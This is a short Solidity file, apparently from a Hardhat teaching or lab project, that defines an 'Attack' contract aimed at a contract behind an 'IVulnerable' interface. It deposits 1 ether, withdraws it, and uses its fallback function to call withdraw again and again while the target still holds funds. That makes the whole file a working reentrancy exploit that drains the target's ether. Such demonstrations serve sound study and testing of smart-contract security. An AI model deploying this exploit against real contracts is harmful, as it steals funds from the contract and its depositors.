// edited from https://gist.github.com/kyriediculous/ca781ee6dae1f364f383ab3fa82ef8fc

// SPDX-License-Identifier: MIT

import "./interfaces/IVulnerable.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

contract Attack {
  uint256 constant amount = 1 ether;
  IVulnerable vulnerableContract;

  constructor(IVulnerable _vulnerableContract) payable {
    require(msg.value == amount);
    vulnerableContract = _vulnerableContract;
  }

  function attack() payable public {
    vulnerableContract.deposit{value: amount}();
    vulnerableContract.withdraw(amount);
  }

  fallback() payable external {
    if (address(vulnerableContract).balance >= amount) vulnerableContract.withdraw(amount);
  }
}